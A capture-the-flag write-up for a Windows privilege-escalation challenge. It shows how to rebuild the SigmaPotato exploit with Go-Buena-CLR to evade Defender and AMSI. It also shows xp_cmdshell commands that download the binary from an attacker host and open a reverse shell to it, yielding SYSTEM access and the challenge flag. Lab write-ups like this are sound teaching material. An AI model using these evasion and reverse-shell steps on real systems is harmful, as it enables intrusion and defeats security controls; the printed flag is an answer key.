# PotatoHead (root)

Writeup by J3554R

---

## Enumeration

By displaying the privileges, it is revealed that the MSSQL account holds the `SeImpersonatePrivilege`, which can be leveraged for LPE. 
```sh
SQL (sa  dbo@master)> xp_cmdshell whoami /all
<SNIP>
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
<SNIP>
```

Different exploits such as [SigmaPotato.exe](https://github.com/tylerdotrar/SigmaPotato) and [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) can be used to exploit this privilege to achieve LPE. However, exploitation is being prevented because Defender keeps terminating processes and removing content it identifies as malicious. Therefore, the binary needs to be modified to avoid detection.

## Bypassing Defender using Go-Buena-CLR 

### Downloading Go-Buena-CLR 
[Go-Buena-CLR](https://github.com/almounah/go-buena-clr) can enable AMSI evasion in some environments by hosting the CLR from a nonstandard process. The tool can be downloaded using the following command:
```sh
$ git clone https://github.com/almounah/go-buena-clr.git
```
### Re-Building the Potato Binary Using Go-Buena-CLR 
Next, navigate to the `go-buena-clr/examples/BuenaVillage` directory and rebuild the exploit binary using the `helper.go` program, as shown below:
```sh
$ cd go-buena-clr/examples/BuenaVillage
$ go get github.com/almounah/go-buena-clr
$ go run helper/helper.go -file=/path/to/sigmapotato.exe && GOOS=windows GOARCH=amd64 go build -o modified-sigmapotato.exe
$ file modified-sigmapotato.exe
modified-sigmapotato.exe: PE32+ executable for MS Windows 6.01 (console), x86-64, 15 sections
```
Replace `/path/to/` with the path to the preferred potato exploit (e.g., [SigmaPotato.exe](https://github.com/tylerdotrar/SigmaPotato)). Running the commands above will produce the binary `modified-sigmapotato.exe`. 

**Note:** Initially, I was able to escalate privileges by utilizing the newest version of the `sigmapotato.exe` exploit in this challenge, but later it started getting blocked by AV, so I ended up downloading the oldest version of the exploit (version [v1.0.0](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.0.0/SigmaPotato.exe)), which successfully ran with the help of the custom CLR without getting removed. 

## Establishing a Privileged Reverse Connection

### Launching a Listener
Launch a netcat listener on the desired port that the system will connect to.
```sh
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```
### Executing the Reverse Shell Command
Copy the `modified-sigmapotato.exe` binary to the directory where your web server or SMB server is running, then download it from within the `mssql` instance.
```sh
SQL (sa  dbo@master)> exec xp_cmdshell 'curl.exe http://10.128.3.14:8888/modified-sigmapotato.exe -o C:\users\public\downloads\modified-sigmapotato.exe'
```

Use `modified-sigmapotato.exe` to run its reverse shell function to connect to your host.
```sh
SQL (sa  dbo@master)> exec xp_cmdshell 'C:\users\public\downloads\modified-sigmapotato.exe --revshell 10.128.3.14 4444'
```
### Reading the Flag
With system access obtained, the flag is now accessible.
```sh
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58430
whoami
nt authority\system
PS C:\Windows\system32> type c:\users\administrator\flag.txt
EPT{sweet_juicy_god_bakt_potet_paa_ruten}
```

Flag: `EPT{sweet_juicy_god_bakt_potet_paa_ruten}`
